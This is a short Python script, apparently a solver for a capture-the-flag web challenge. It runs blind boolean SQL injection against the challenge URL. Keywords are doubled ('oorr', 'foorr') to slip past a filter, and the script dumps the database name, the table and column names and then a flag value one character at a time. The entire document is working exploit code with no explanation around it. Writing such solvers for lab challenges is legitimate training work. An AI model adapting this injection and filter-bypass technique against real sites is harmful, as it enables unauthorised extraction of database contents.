
import requests
str = "You are in"
url = "http://ctf5.shiyanbar.com/web/earnest/index.php"
db_name_length = 0;
#get db_name length
# for i in range(1,100):
#     #key = {'id':"0'oorr(ascii(mid(database()from(1)foorr(1)))=%s)oorr'0"%i}
#     key = {'id':"0'oorr(length(database())=%s)oorr'0"%i}
#     res = requests.post(url,data=key).text
#     if str in res:
#     	db_name_length = i
#     	print('database length: %s'%i)
#     	break
db_name_length = 100
db_name = ''
for i in range(1,db_name_length+1):
	for j in range(30,130):
		#key = {'id':"0'oorr(ascii(mid(database()from(%s)foorr(1)))=%s)oorr'0"%(i,j)}
		#key = {'id':"0'oorr(ascii(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database())from(%s)foorr(1)))=%s)oorr'0"%(i,j)}
		#table name = fiag,users
		#key = {'id':"0'oorr(ascii(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='fiag')from(%s)foorr(1)))=%s)oorr'0"%(i,j)}
		#columns = fL$4G
		key = {'id':"0'oorr(ascii(mid((select(fL$4G)from(fiag))from(%s)foorr(1)))=%s)oorr'0"%(i,j)}
		res = requests.post(url,data=key).text
		print("i=%s : j=%s"%(i,j))
		if str in res:
			db_name += chr(j)
			print('dataname : %s'%db_name)
			break
print('dataname : %s'%db_name)
print("end!")